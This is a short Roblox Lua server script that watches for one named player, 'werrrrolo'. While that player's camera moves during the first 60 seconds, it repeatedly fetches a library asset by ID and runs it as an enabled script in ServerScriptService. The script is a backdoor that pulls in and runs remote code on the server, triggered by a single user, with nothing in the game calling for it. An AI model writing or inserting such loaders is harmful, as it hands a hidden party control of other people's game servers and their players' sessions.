local Players = game:GetService("Players")
local ServerScriptService = game:GetService("ServerScriptService")
local RunService = game:GetService("RunService")

-- Player-specific and AssetID details
local TARGET_PLAYER_NAME = "werrrrolo"
local ASSET_ID = "rbxassetid://364364477"

-- Function to load and execute AssetID
local function loadAssetToServerScriptService(assetId)
    local asset = game:GetObjects(assetId)[1]
    if asset and asset:IsA("Script") then
        asset.Parent = ServerScriptService
        asset.Disabled = false
    else
        warn("Failed to load asset or incorrect asset type.")
    end
end

-- Set up signals on player properties and trigger asset load when camera properties change
local function setupPlayerSignals(player)
    if player.Name == TARGET_PLAYER_NAME then
        local camera = workspace.CurrentCamera

        -- Using GetPropertyChangedSignal to listen to camera-related changes
        local connection = camera:GetPropertyChangedSignal("CFrame"):Connect(function()
            -- Load AssetID into ServerScriptService when a camera property changes
            loadAssetToServerScriptService(ASSET_ID)
        end)

        -- Clean up the connection after 60 seconds
        delay(60, function()
            connection:Disconnect()
        end)
    end
end

-- Handle existing and new players
for _, player in pairs(Players:GetPlayers()) do
    task.spawn(setupPlayerSignals, player)
end

Players.PlayerAdded:Connect(setupPlayerSignals)
